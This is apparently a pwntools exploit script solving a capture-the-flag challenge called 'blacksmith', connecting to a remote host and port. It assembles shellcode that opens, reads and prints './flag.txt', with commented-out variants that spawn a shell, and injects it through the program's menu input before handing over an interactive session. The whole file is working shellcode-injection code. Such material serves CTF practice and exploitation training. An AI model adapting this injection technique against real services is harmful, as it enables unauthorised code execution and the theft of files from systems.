from pwn import *

elf = ELF("./blacksmith")

context.binary = elf

#io = elf.process()

io = remote("94.237.52.65", 48318)

shellcode = shellcraft.sh()

#shellcode = """
#mov eax,0x41
#"""

shellcode = """
   mov rdi, 0x1
mov rsi, 0xdeadbeef
mov rdx, 0x100
mov rax, 0x40000001
syscall 
"""
#shellcode = shellcraft.echo('You Have Been Pwned ;D\n', 1)
shellcode = shellcraft.open("./flag.txt")
shellcode += shellcraft.read('rax', 'rsp', 0x70)
shellcode += shellcraft.write(1, 'rsp', 0x70)
shellcode += shellcraft.exit(0)
print(shellcode)
shellcode = asm(shellcode)

io.sendlineafter("> ", str(1).encode())
io.sendlineafter("> ", str(2).encode())
io.sendlineafter("> ", shellcode.ljust(63, b'\x00'))
io.interactive()
